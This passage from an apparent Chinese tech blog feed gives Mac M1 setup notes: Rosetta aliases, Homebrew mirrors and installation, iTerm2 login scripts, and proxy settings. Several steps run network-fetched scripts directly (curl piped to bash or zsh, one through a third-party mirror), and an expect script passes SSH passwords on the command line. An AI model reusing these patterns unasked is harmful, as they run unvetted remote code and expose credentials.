&lt;li&gt;日志框架一般分为编程API和日志打印实现。编程API为应用程序基于此API进行编程，如slf4j；打印实现为实现
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="arch" scheme="http://blog.aezo.cn/tags/arch/"/>
    
      <category term="log" scheme="http://blog.aezo.cn/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>Mac</title>
    <link href="http://blog.aezo.cn/2021/08/30/linux/mac/"/>
    <id>http://blog.aezo.cn/2021/08/30/linux/mac/</id>
    <published>2021-08-30T08:11:00.000Z</published>
    <updated>2023-08-01T02:45:13.696Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>版本：Mac M1 11.4</li><li>Mac软件下载<ul><li><a href="https://www.macwk.com/" target="_blank" rel="noopener">https://www.macwk.com/</a><ul><li>应用闪退问题<ul><li><a href="https://www.macwk.com/article/apple-silicon-m1-application-crash-repair" target="_blank" rel="noopener">https://www.macwk.com/article/apple-silicon-m1-application-crash-repair</a></li><li><a href="https://www.macwk.com/article/macos-beta-damage" target="_blank" rel="noopener">https://www.macwk.com/article/macos-beta-damage</a></li></ul></li></ul></li><li><a href="https://www.macapp.so/" target="_blank" rel="noopener">https://www.macapp.so/</a></li></ul></li></ul><h2 id="M1模拟x86环境"><a href="#M1模拟x86环境" class="headerlink" title="M1模拟x86环境"></a>M1模拟x86环境</h2><ul><li>Mac M1(默认只能执行arm结构)执行x86(Intel)程序，可基于Rosetta，参考下文安装多版本brew</li><li>参考: <a href="https://notemi.cn/installing-python-on-mac-m1-pyenv.html" target="_blank" rel="noopener">https://notemi.cn/installing-python-on-mac-m1-pyenv.html</a></li><li>参考上文安装完后设置命令别名(brew和pyenv可选)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment">## ===arm(m1) or x86(intel) ===</span></span><br><span class="line"><span class="comment"># switch arch zsh: mzsh 和 xzsh，输入别名及切换环境，而不需要切换终端</span></span><br><span class="line"><span class="built_in">alias</span> mzsh=<span class="string">"arch -arm64 zsh"</span></span><br><span class="line"><span class="built_in">alias</span> xzsh=<span class="string">"arch -x86_64 zsh"</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$(uname -p)</span>"</span> = <span class="string">"i386"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"zsh Running in i386(x86) mode (Rosetta). use 'xzsh' switch to i386(x86), use 'mzsh' switch to ARM(M1)"</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">"<span class="variable">$(/usr/local/bin/brew shellenv)</span>"</span></span><br><span class="line">  <span class="built_in">alias</span> brew=<span class="string">'arch -x86_64 /usr/local/bin/brew'</span></span><br><span class="line">  <span class="built_in">alias</span> pyenv=<span class="string">'arch -x86_64 /usr/local/bin/pyenv'</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"zsh Running in ARM mode (M1). use 'xzsh' switch to i386(x86), use 'mzsh' switch to ARM(M1)"</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">"<span class="variable">$(/opt/homebrew/bin/brew shellenv)</span>"</span></span><br><span class="line">  <span class="built_in">alias</span> brew=<span class="string">'/opt/homebrew/bin/brew'</span></span><br><span class="line">  <span class="built_in">alias</span> pyenv=<span class="string">'$HOME/.pyenv/bin/pyenv'</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># x86版本</span></span><br><span class="line"><span class="built_in">alias</span> xpyenv=<span class="string">'arch -x86_64 /usr/local/bin/pyenv'</span></span><br><span class="line"><span class="built_in">alias</span> xbrew=<span class="string">"/usr/local/bin/brew"</span></span><br><span class="line"><span class="comment"># arm版本</span></span><br><span class="line"><span class="built_in">alias</span> mpyenv=<span class="string">'$HOME/.pyenv/bin/pyenv'</span></span><br><span class="line"><span class="built_in">alias</span> mbrew=<span class="string">"/opt/homebrew/bin/brew"</span></span><br><span class="line"><span class="comment">## ===arm(m1) or x86(intel) ===</span></span><br></pre></td></tr></table></figure><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cmd+c <span class="comment"># 复制</span></span><br><span class="line">cmd+v <span class="comment"># 粘贴</span></span><br><span class="line">cmd+opt+c <span class="comment"># 复制文件夹绝对路径</span></span><br><span class="line">cmd+opt+v <span class="comment"># 剪贴(相当于剪切文件，需先复制)</span></span><br><span class="line"></span><br><span class="line">cmd+<span class="built_in">shift</span>+. <span class="comment"># 在 Finder 中显示隐藏文件</span></span><br><span class="line">cmd+<span class="built_in">shift</span>+g <span class="comment"># 在 Finder 中前往目标目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合按键</span></span><br><span class="line">delete: cmd+删除键</span><br><span class="line">insert: ESC -&gt; i <span class="comment"># 按一下ESC键，随后 i 代表</span></span><br><span class="line">replace: ESC -&gt; r</span><br><span class="line">home: fn＋左</span><br><span class="line">end: fn＋右</span><br></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul><li><code>open /root</code> 在Finder中打开某个目录(默认有些目录时不会显示在Finder中的)</li><li><code>lsof -i -P | grep 21</code> 查看端口占用情况，或<code>lsof -i :21</code>(类似netstat查找端口功能)</li></ul><h2 id="个性化配置"><a href="#个性化配置" class="headerlink" title="个性化配置"></a>个性化配置</h2><ul><li>终端文件夹颜色：基于别名完成，在<code>~/.bash_profile</code>中加入，然后设置<code>echo &#39;source ~/.bash_profile&#39; &gt;&gt; ~/.zshrc</code>让每次打开终端都生效</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#alias cls='tput reset'</span></span><br><span class="line"><span class="comment">#alias egrep='egrep -G'</span></span><br><span class="line"><span class="comment">#alias fgrep='fgrep -G'</span></span><br><span class="line"><span class="comment">#alias grep='grep -G'</span></span><br><span class="line"><span class="built_in">alias</span> l.=<span class="string">'ls -d .*'</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">'ls -l -G'</span></span><br><span class="line"><span class="built_in">alias</span> ls=<span class="string">'ls -G'</span></span><br><span class="line"><span class="built_in">alias</span> vi=<span class="string">'vim'</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">which</span>=<span class="string">'alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde'</span></span><br></pre></td></tr></table></figure><h2 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h2><h3 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h3><h4 id="brew安装"><a href="#brew安装" class="headerlink" title="brew安装"></a>brew安装</h4><ul><li>安装<a href="https://brew.sh/" target="_blank" rel="noopener">brew</a>包管理工具</li><li>更换镜像</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 更换镜像(arm和x86模式需要分别设置)，参考：https://www.cnblogs.com/trotl/p/11862796.html</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.aliyun.com/homebrew/brew.git</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span>/Library/Taps/homebrew/homebrew-cask</span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换homebrew-bottles</span></span><br><span class="line"><span class="comment"># echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles' &gt;&gt; ~/.bash_profile</span></span><br><span class="line"><span class="comment"># source ~/.bash_profile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决brew安装包一直卡在Updating Homebrew</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_NO_AUTO_UPDATE=true'</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure><ul><li>arm和x86模式安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## arm(M1)安装v3.2.11</span></span><br><span class="line"><span class="comment"># 安装位置 /opt/homebrew, 安装的包位置 /opt/homebrew/opt, 配置文件位置 /etc</span></span><br><span class="line"><span class="comment"># (需要命令行设置代理FQ下载速度会快些，可能需要多试几次)</span></span><br><span class="line">bash -c <span class="string">"<span class="variable">$(curl -fsSL https://sourcegraph.com/github.com/Homebrew/install@master/-/raw/install.sh)</span>"</span></span><br><span class="line">bash -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>"</span></span><br><span class="line"><span class="comment"># 安装完后会生成如下两条命令</span></span><br><span class="line"><span class="comment"># 加入到用户配置文件，每次用户登录，使/opt/homebrew/bin生效</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'eval "$(/opt/homebrew/bin/brew shellenv)"'</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br><span class="line"><span class="comment"># eval "$(/opt/homebrew/bin/brew shellenv)" # 直接时/opt/homebrew/bin在当前命令行生效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## x86(Inter)安装v3.6.21</span></span><br><span class="line"><span class="comment"># 安装位置 /usr/local/Homebrew, 安装的包位置 /usr/local/Cellar, 配置文件位置 /usr/local/etc</span></span><br><span class="line"><span class="comment"># 前期准备工作参考: https://towardsdatascience.com/how-to-use-manage-multiple-python-versions-on-an-apple-silicon-m1-mac-d69ee6ed0250</span></span><br><span class="line"><span class="comment"># 安装Rosetta: https://www.bilibili.com/read/cv14826978</span></span><br><span class="line">softwareupdate --install-rosetta</span><br><span class="line"><span class="comment"># 然后复制一个item2出来并重命名为item2 Rosetta，打开简介，勾选使用Rosetta打开；之后使用item2 Rosetta执行的命令就是模拟x86环境，或者使用普通item2在执行命令前加`arch -x86_64`，如`arch -x86_64 bash -c ...`</span></span><br><span class="line"><span class="comment"># 打开item2 Rosetta并执行安装</span></span><br><span class="line">bash -c <span class="string">"<span class="variable">$(curl -fsSL https://sourcegraph.com/github.com/Homebrew/install@master/-/raw/install.sh)</span>"</span></span><br><span class="line"><span class="comment"># 为 x86 的 Homebrew 设定 alias</span></span><br><span class="line"><span class="comment"># vi ~/.bash_profile 增加下列代码</span></span><br><span class="line"><span class="built_in">alias</span> xbrew=<span class="string">'arch -x86_64 /usr/local/bin/brew'</span></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure><h4 id="brew使用"><a href="#brew使用" class="headerlink" title="brew使用"></a>brew使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## brew 使用</span></span><br><span class="line">brew -v</span><br><span class="line">brew update  <span class="comment"># 升级brew</span></span><br><span class="line">brew upgrade <span class="comment"># 升级所有包(也可单独指定)</span></span><br><span class="line">brew install wget</span><br><span class="line">brew uninstall wget</span><br><span class="line"><span class="comment"># 安装指定版本</span></span><br><span class="line">brew search gcc</span><br><span class="line">brew install gcc@7</span><br><span class="line"></span><br><span class="line"><span class="comment"># brew services(第一次运行会自动安装)</span></span><br><span class="line">brew services list  <span class="comment"># 查看使用brew安装的服务列表</span></span><br><span class="line">brew services run nginx|--all  <span class="comment"># 启动服务（仅启动不注册）</span></span><br><span class="line">brew services start nginx|--all  <span class="comment"># 启动服务，并注册</span></span><br><span class="line">brew services stop nginx|--all   <span class="comment"># 停止服务，并取消注册</span></span><br><span class="line">brew services restart nginx|--all  <span class="comment"># 重启服务，并注册</span></span><br><span class="line">brew services cleanup  <span class="comment"># 清除已卸载应用的无用的配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nginx服务信息(包括启动脚本、配置文件)</span></span><br><span class="line">brew info nginx</span><br></pre></td></tr></table></figure><h4 id="brew安装常用软件"><a href="#brew安装常用软件" class="headerlink" title="brew安装常用软件"></a>brew安装常用软件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># brew安装nginx仅稳定版，如果需要安装其他版本可基于docker运行</span></span><br><span class="line"><span class="comment"># 安装目录：/opt/homebrew/opt/nginx</span></span><br><span class="line"><span class="comment"># 配置文件目录：/opt/homebrew/etc/nginx/nginx.conf</span></span><br><span class="line">brew install nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 核心工具命令，如：numfmt</span></span><br><span class="line">brew install coreutils</span><br><span class="line"></span><br><span class="line"><span class="comment"># c++ qt框架</span></span><br><span class="line">brew install qt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成目录树命令(windows可直接使用)</span></span><br><span class="line">brew install tree</span><br><span class="line"><span class="comment"># -L打印层级；mac上tree命令不支持忽略多个文件夹，多个需配合grep使用；默认不会打印影藏的文件和目录</span></span><br><span class="line">tree -L 3 -I <span class="string">"node_modules"</span> | grep -v -e <span class="string">"dist"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件路径如`/opt/homebrew/etc/redis.conf`</span></span><br><span class="line">brew install redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># rabbitmq</span></span><br><span class="line">brew install rabbitmq</span><br><span class="line">brew services restart rabbitmq <span class="comment"># 后台启动</span></span><br><span class="line">CONF_ENV_FILE=<span class="string">"/opt/homebrew/etc/rabbitmq/rabbitmq-env.conf"</span> /opt/homebrew/opt/rabbitmq/sbin/rabbitmq-server <span class="comment"># 命令行启动</span></span><br><span class="line"><span class="comment"># 管理端 http://localhost:15672 guest/guest</span></span><br></pre></td></tr></table></figure><h3 id="VPN-PPTP"><a href="#VPN-PPTP" class="headerlink" title="VPN(PPTP)"></a>VPN(PPTP)</h3><ul><li><a href="https://vladtalks.tech/vpn/setup-pptp-vpn-on-mac" target="_blank" rel="noopener">https://vladtalks.tech/vpn/setup-pptp-vpn-on-mac</a></li></ul><h2 id="开发软件安装"><a href="#开发软件安装" class="headerlink" title="开发软件安装"></a>开发软件安装</h2><h3 id="Royal-TSX"><a href="#Royal-TSX" class="headerlink" title="Royal TSX"></a>Royal TSX</h3><ul><li>支持多SSH/FTP/SFTP/RemoteDesktop终端管理</li><li>快捷键<ul><li>Cmd+0 切换左侧导航显示</li><li>Cmd+i 显示当前连接配置</li></ul></li><li>New - Terminal 新建连接<ul><li>Terminal<ul><li>只有通过SSH连接才能开启Tunnal，如果通过Customer Terminal + expect脚本则不行(且不能直接连接SFTP)</li></ul></li><li>Credentials<ul><li>ssh基于秘钥连接时: Credentials - Credential中用户名密码只需要配置用户名；Private Key File填秘钥路径</li></ul></li><li>Custom Properties<ul><li>配置Key-Value键值对后: 可在连接配置 - 右键 - Copy to Clipboard - 可复制配置的键值对</li></ul></li><li>Tunnels<ul><li>Dynamic 只能绑定到本地(无法开放给局域网访问)，如果基于局域网可以通过快捷命令完成</li></ul></li></ul></li><li>New - Secure Gateway 新建加密网关<ul><li>如访问生产环境一般需要跳板机，此处的加密网关就是配置登录跳板机，如果是基于秘钥的登录则需要先设置全局密码</li></ul></li><li>Application - Credentials 设置全局密码(可用于加密网关)<ul><li>如果是基于秘钥的可同时设置账号(不用设置密码) + 秘钥文件</li></ul></li><li>Application - Tasks 全局命令(命令只能调用本地Terminal, 不能发送到Royal Terminal)<ul><li>命令中可使用很多变量，如<code>$URI$</code>表示当前连接的ip地址</li></ul></li></ul><h3 id="Item2"><a href="#Item2" class="headerlink" title="Item2"></a>Item2</h3><ul><li>终端管理相关软件<ul><li>Royal TSX比较好用(收费)</li><li>目前发现 Item2 还算比较理想</li><li>mac不支持xshell</li><li>FinalShell、Termius 不太好用</li></ul></li><li>Item2下载(v3.4.9)：<a href="https://iterm2.com/" target="_blank" rel="noopener">https://iterm2.com/</a></li><li><p>创建一个服务器Session</p><ul><li>复制一个<code>Profile</code>(可立即为一个服务器Session配置)</li><li><p>创建文件，如<code>/Users/smalle/data/item2/login-aezo-ss.exp</code></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> timeout 30</span><br><span class="line">spawn ssh -p [lindex <span class="variable">$argv</span> 0] [lindex <span class="variable">$argv</span> 1]@[lindex <span class="variable">$argv</span> 2]</span><br><span class="line">expect &#123;</span><br><span class="line">    <span class="string">"(yes/no)?"</span></span><br><span class="line">    &#123;send <span class="string">"yes\n"</span>;exp_continue&#125;</span><br><span class="line">    <span class="string">"password:"</span></span><br><span class="line">    &#123;send <span class="string">"[lindex <span class="variable">$argv</span> 3]\n"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure></li><li><p>设置文件为可执行<code>chmod +x /Users/smalle/data/item2/login.exp</code></p></li><li>Profiles - Open Profiles - Edit Profiles - General - Command(并选择Command) - 输入<code>/Users/smalle/data/item2/login.exp 22 root 192.168.1.100 mypass</code></li><li>Profiles - 双击对应Profile即可登录服务器</li></ul></li><li>快捷键<ul><li>更多参考：<a href="https://www.jianshu.com/p/a0249778872e" target="_blank" rel="noopener">https://www.jianshu.com/p/a0249778872e</a></li><li><strong>在 Finder 中打开当前目录 <code>open .</code></strong></li><li>按住 ⌘ 键<ul><li>可以拖拽选中的字符串</li><li>点击 url：调用默认浏览器访问该网址</li><li>点击文件：调用默认程序打开文件</li><li>点击文件夹：在 finder 中打开该文件夹</li><li>同时按住 option 键，可以以矩形选中，类似于 vim 中的 ctrl v 操作</li></ul></li><li>呼出粘贴历史 <code>Command + Shift + h</code></li><li>将文本内容复制到剪切板 <code>pbcopy &lt; text.md</code></li></ul></li><li>热键悬浮窗口<ul><li>创建一个Profile</li><li>Keys - Configure Hotkey Window <ul><li>Hotkey(如设置cmd+g): 用于打开和关闭悬浮窗口</li><li>Floating window: 勾选后，悬浮窗口会显示在屏幕最前面</li></ul></li></ul></li><li>使用 shell integration<ul><li>iTerm2 可以与 unix shell 集成在一起，在安装了 iTerm2 的 shell 集成工具后，可以在 iTerm2 中看到命令历史、当前工作目录、主机名、上传下载文件等</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 安装 item2 shell integration，会往 .zshrc 文件中增加一行代码</span></span><br><span class="line"><span class="comment"># 在安装完 iTerm2 的 shell integration 后会在终端界面中最左侧多出一个蓝色三角形的标记</span></span><br><span class="line"><span class="comment"># 如需关闭标记，可以在 iTerm2 &gt; Preferences &gt; Profiles &gt; (your profile) &gt; Terminal 最下面 &gt; Shell Integration 关闭 Show mark indicators</span></span><br><span class="line">curl -L https://iterm2.com/misc/install_shell_integration.sh | zsh</span><br><span class="line"></span><br><span class="line"><span class="comment">## shell integration 支持的工具参考：https://iterm2.com/documentation-utilities.html，下载地址均为 https://iterm2.com/utilities/xxx</span></span><br><span class="line"><span class="comment"># 安装 it2copy: 复制文本到剪贴板(需开启 Prefs &gt; General &gt; Selection &gt; Applications in terminal may access clipboard 配置)</span></span><br><span class="line">curl <span class="string">"https://iterm2.com/utilities/it2copy"</span> &gt; it2copy</span><br><span class="line">sudo chmod +x it2copy &amp;&amp; sudo mv it2copy /usr/<span class="built_in">local</span>/bin</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">it2copy file.txt</span><br><span class="line">cat file.txt | it2copy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 it2ul: 上传文件</span></span><br><span class="line">curl <span class="string">"https://iterm2.com/utilities/it2ul"</span> &gt; it2ul</span><br><span class="line">sudo chmod +x it2ul &amp;&amp; sudo mv it2ul /usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 it2dl: 下载文件</span></span><br><span class="line">curl <span class="string">"https://iterm2.com/utilities/it2dl"</span> &gt; it2dl</span><br><span class="line">sudo chmod +x it2dl &amp;&amp; sudo mv it2dl /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure><ul><li><strong>设置代理，加速访问github等</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi ~/.zshrc</span></span><br><span class="line"><span class="comment"># 编辑好文件后，重新打开item2 Tab，执行proxy开启代理。可使用`curl cip.cc`测试当前IP地址</span></span><br><span class="line"><span class="built_in">alias</span> proxy=<span class="string">"export ALL_PROXY=socks5://127.0.0.1:1088"</span></span><br><span class="line"><span class="built_in">alias</span> unproxy=<span class="string">"unset ALL_PROXY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用</span></span><br><span class="line"><span class="comment"># 参考下文，使用item2快速脚本启动代理</span></span><br><span class="line"><span class="comment"># 网络设置里面设置网线(USB)/Wifi对应适配器的SOCKS代理即可, 如 127.0.0.1 1088</span></span><br><span class="line"><span class="comment"># 命令行执行proxy/unproxy启用/关闭当前命令行代理 (使用v2ray全局代理对应命令行无效)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 命令行加速也可以使用Item2+Proxifier方式，参考下文</span></span><br></pre></td></tr></table></figure><ul><li>配色方案：<a href="https://iterm2colorschemes.com/" target="_blank" rel="noopener">https://iterm2colorschemes.com/</a></li><li>防止长时间不用断线问题：在<code>~/.ssh/config</code>(可能需要新建)中加入<code>ServerAliveInterval 60</code></li><li><p><a href="https://iterm2.com/python-api/tutorial/index.html" target="_blank" rel="noopener">Scripts使用</a></p><ul><li>菜单说明<ul><li>New Python Scripts<ul><li>Basic(只能基于python官方库和item2库写脚本),Full(创建一个python虚拟环境)</li><li>Simple(命令型)、Long-Running Daemon(后台一直运行)</li></ul></li><li>Open Python REPL(打开python命令行)</li><li>Reveal Scripts in Finder(在Finder中显示脚本文件)</li><li>Console 脚本执行日志控制台</li></ul></li><li>API参考：<a href="https://iterm2.com/python-api/index.html" target="_blank" rel="noopener">https://iterm2.com/python-api/index.html</a></li><li><p>脚本案例: 启动代理(配合Proxifier可实现软件网络代理)</p>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> iterm2</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(connection)</span>:</span></span><br><span class="line">    app = <span class="keyword">await</span> iterm2.async_get_app(connection)</span><br><span class="line">    window = app.current_terminal_window</span><br><span class="line">    <span class="comment"># 执行命令(开启SOCKS隧道)</span></span><br><span class="line">    <span class="keyword">await</span> window.async_create(connection, command=<span class="string">'ssh -D 0.0.0.0:1088 root@8.12.12.149 "vmstat 30"'</span>)</span><br><span class="line"></span><br><span class="line">iterm2.run_until_complete(main)</span><br></pre></td></tr></table></figure><ul><li>使用<ul><li>启动此脚本</li><li>设置Proxifier Rules</li><li>访问目标网址，如: <a href="https://cip.cc" target="_blank" rel="noopener">https://cip.cc</a></li></ul></li></ul></li></ul></li><li>基于lrzsz进行文件上传和下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考：https://mikuac.com/archives/882/</span></span><br><span class="line"><span class="comment"># 1.mac安装lrzsz</span></span><br><span class="line">brew install lrzsz</span><br><span class="line"><span class="comment"># 查询lrzsz位置并设置软连接</span></span><br><span class="line">brew list lrzsz</span><br><span class="line">ln -s /opt/homebrew/Cellar/lrzsz/0.12.20_1/bin/lrz /usr/<span class="built_in">local</span>/bin/rz</span><br><span class="line">ln -s /opt/homebrew/Cellar/lrzsz/0.12.20_1/bin/lsz /usr/<span class="built_in">local</span>/bin/sz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考：https://blog.csdn.net/weixin_42948074/article/details/120494608</span></span><br><span class="line"><span class="comment"># 2.增加iterm2-zmodem脚本，并chmod +x设置可执行</span></span><br><span class="line"><span class="comment"># 3.配置item2触发器</span></span><br></pre></td></tr></table></figure><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><ul><li>到Oracle官网下载dmg格式文件进行安装，可安装多个版本</li><li><code>/usr/libexec/java_home -V</code> 查看可用的JDK版本<ul><li>切换版本参考下文jenv，也可修改<code>~/.zshrc</code>中配置中的JAVA_HOME</li></ul></li><li>安装完后删除<code>/Library/Internet Plug-Ins/JavaAppletPlugin.plugin</code>目录<ul><li>如<code>sudo mv /Library/Internet\ Plug-Ins/JavaAppletPlugin.plugin /Library/Internet\ Plug-Ins/JavaAppletPlugin.plugin.bak</code></li><li>否则mvn命令执行时报错，参考：<a 